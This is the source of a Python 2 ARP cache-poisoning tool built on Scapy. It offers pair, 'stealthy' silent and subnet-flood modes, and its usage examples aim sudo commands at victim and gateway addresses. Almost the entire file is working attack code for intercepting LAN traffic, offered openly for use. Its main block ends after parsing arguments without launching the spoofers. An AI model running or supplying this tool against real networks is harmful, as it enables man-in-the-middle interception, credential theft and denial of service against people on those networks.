#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
ARP-Poisoner (Py-2.7 edition)
-----------------------------

Modes
~~~~~
* *pair*   – poison one or more <victim, gateway> pairs (default).
* *silent* – answer only when ARP requests are heard (stealthy).
* *flood*  – claim every IP in a CIDR is at the attacker’s MAC.

Examples
~~~~~~~~
    sudo python2 arp_poisoner27.py \
         --iface enp0s10 \
         --victims 10.0.123.4,10.0.123.7 \
         --gateway 10.0.123.1 \
         --interval 4               # active pair mode

    sudo python2 arp_poisoner27.py \
         --iface enp0s10 \
         --mode flood \
         --cidr 10.0.123.0/24       # flood /24 every 10 s

    sudo python2 arp_poisoner27.py \
         --iface enp0s10 \
         --mode silent \
         --victims 10.0.123.4 --gateway 10.0.123.1
"""

import logging
import signal
import threading
import time

try:
    import ipaddress          # back-port for Py-2
except ImportError:
    raise SystemExit("Install the 'ipaddress' back-port:  sudo pip install ipaddress")

from scapy.all import (
    ARP,
    Ether,
    get_if_hwaddr,
    getmacbyip,
    sendp,
    sniff,
)

# ---------------------------------------------------------------------------

logging.basicConfig(format='[%(levelname).1s] %(message)s', level=logging.INFO)
log = logging.getLogger('arp')

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def craft(is_at_mac, dst_ip, dst_mac, src_ip):
    """Return one forged Ethernet/ARP *reply* frame (is-at)."""
    return Ether(src=is_at_mac, dst=dst_mac) / ARP(
        op=2,          # is-at
        psrc=src_ip,
        hwsrc=is_at_mac,
        pdst=dst_ip,
        hwdst=dst_mac,
    )


def resolve_mac(ip):
    mac = getmacbyip(ip)
    if not mac:
        raise RuntimeError("Could not resolve MAC for %s – host down?" % ip)
    return mac

# ---------------------------------------------------------------------------
# Thread classes
# ---------------------------------------------------------------------------


class ActivePairSpoofer(threading.Thread):
    """Periodically poisons exactly one <victim, gateway> pair."""

    def __init__(self, iface, victim, gateway, attacker_mac, interval=10.0):
        threading.Thread.__init__(self)
        self.daemon = True
        self.iface = iface
        self.victim = victim          # (ip, mac)
        self.gateway = gateway        # (ip, mac)
        self.attacker_mac = attacker_mac
        self.interval = interval
        self._run = True

    def _spoof_once(self):
        v_ip, v_mac = self.victim
        g_ip, g_mac = self.gateway

        # “I am the gateway” → victim
        sendp(craft(self.attacker_mac, v_ip, v_mac, g_ip),
              iface=self.iface, verbose=False)
        # “I am the victim”  → gateway
        sendp(craft(self.attacker_mac, g_ip, g_mac, v_ip),
              iface=self.iface, verbose=False)

    def _restore_once(self):
        v_ip, v_mac = self.victim
        g_ip, g_mac = self.gateway
        for _ in range(5):
            sendp(craft(g_mac, v_ip, v_mac, g_ip),
                  iface=self.iface, verbose=False)
            sendp(craft(v_mac, g_ip, g_mac, v_ip),
                  iface=self.iface, verbose=False)
            time.sleep(0.2)

    def run(self):
        log.info("[pair %s ↔ %s] active poisoning started",
                 self.victim[0], self.gateway[0])
        while self._run:
            self._spoof_once()
            time.sleep(self.interval)
        self._restore_once()

    def stop(self):
        self._run = False


class FloodSpoofer(threading.Thread):
    """Send forged replies for *all* IPs in a CIDR."""

    def __init__(self, iface, cidr, gateway_ip, attacker_mac, interval=10.0):
        threading.Thread.__init__(self)
        self.daemon = True
        self.iface = iface
        self.cidr = ipaddress.ip_network(cidr, strict=False)
        self.gateway_ip = gateway_ip
        self.attacker_mac = attacker_mac
        self.interval = interval
        self._run = True

    def _spoof_once(self):
        for ip in self.cidr.hosts():
            sendp(craft(self.attacker_mac, str(ip),
                        "ff:ff:ff:ff:ff:ff", self.gateway_ip),
                  iface=self.iface, verbose=False)

    def run(self):
        log.info("[flood %s] poisoning whole subnet…", self.cidr)
        while self._run:
            self._spoof_once()
            time.sleep(self.interval)

    def stop(self):
        self._run = False     # caches will decay naturally


class SilentResponder(threading.Thread):
    """Passive: answer incoming ARP requests with forged replies."""

    def __init__(self, iface, victim, gateway, attacker_mac):
        threading.Thread.__init__(self)
        self.daemon = True
        self.iface = iface
        self.victim = victim
        self.gateway = gateway
        self.attacker_mac = attacker_mac
        self._run = True

    def _handle(self, pkt):
        if not pkt.haslayer(ARP) or pkt[ARP].op != 1:   # who-has only
            return

        dst_ip = pkt[ARP].pdst
        src_ip = pkt[ARP].psrc
        v_ip, v_mac = self.victim
        g_ip, g_mac = self.gateway

        # victim → gateway
        if src_ip == v_ip and dst_ip == g_ip:
            sendp(craft(self.attacker_mac, v_ip, v_mac, g_ip),
                  iface=self.iface, verbose=False)

        # gateway → victim
        elif src_ip == g_ip and dst_ip == v_ip:
            sendp(craft(self.attacker_mac, g_ip, g_mac, v_ip),
                  iface=self.iface, verbose=False)

    def run(self):
        log.info("[pair %s ↔ %s] silent responder active",
                 self.victim[0], self.gateway[0])
        sniff(iface=self.iface, filter="arp", prn=self._handle,
              store=0, stop_filter=lambda *_: (not self._run))

    def stop(self):
        self._run = False

# ---------------------------------------------------------------------------
# Orchestrator
# ---------------------------------------------------------------------------


class PoisonManager(object):
    def __init__(self):
        self.threads = []

    def add(self, thread):
        self.threads.append(thread)
        thread.start()

    def stop_all(self, *_):
        log.info("Stopping … restoring caches where applicable.")
        for t in self.threads:
            if hasattr(t, "stop"):
                t.stop()
        for t in self.threads:
            t.join()


if __name__ == "__main__":
    import argparse
    from textwrap import dedent

    parser = argparse.ArgumentParser(
        prog="arp.py",
        description="ARP cache–poisoning tool for Python-2.7 + Scapy 2.4.x\n"
                    "(supports active pair, silent responder, and flood modes)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=dedent("""\
            Examples
            ---------
            • Active pair attack (2 victims, 4-second refresh)
              sudo python2 arp.py -i enp0s10 \
                   --victims 10.0.123.4,10.0.123.7 \
                   --gateway  10.0.123.1 \
                   --interval 4

            • Silent on-demand poisoning of a single host
              sudo python2 arp.py -i enp0s10 \
                   --mode silent \
                   --victims 10.0.123.4 --gateway 10.0.123.1

            • Flood entire /24 every 10 s
              sudo python2 arp.py -i enp0s10 \
                   --mode flood \
                   --cidr 10.0.123.0/24 --gateway 10.0.123.1
        """)
    )

    parser.add_argument(
        "--mode", choices=["pair", "silent", "flood"], default="pair",
        help="Operating mode:\n"
             "  pair   – periodic poisoning of <victim, gateway> pairs (default)\n"
             "  silent – only answer ARP 'who-has' requests, stealthy\n"
             "  flood  – broadcast forged replies for an entire CIDR"
    )

    parser.add_argument(
        "-i", "--iface", required=True,
        help="Interface to send/receive raw Ethernet frames (e.g. enp0s10)"
    )

    parser.add_argument(
        "--victims",
        help="Comma-separated victim IPv4 list (required in pair/silent mode)"
    )
    parser.add_argument(
        "--gateway",
        help="Gateway (router) IPv4 address (required in pair/silent & flood)"
    )

    parser.add_argument(
        "--cidr",
        help="IPv4 CIDR to poison in flood mode, e.g. 192.168.1.0/24"
    )

    parser.add_argument(
        "--interval", type=float, default=10.0,
        help="Seconds between poison bursts (pair / flood). "
             "Ignored in silent mode. Default: 10"
    )

    args = parser.parse_args()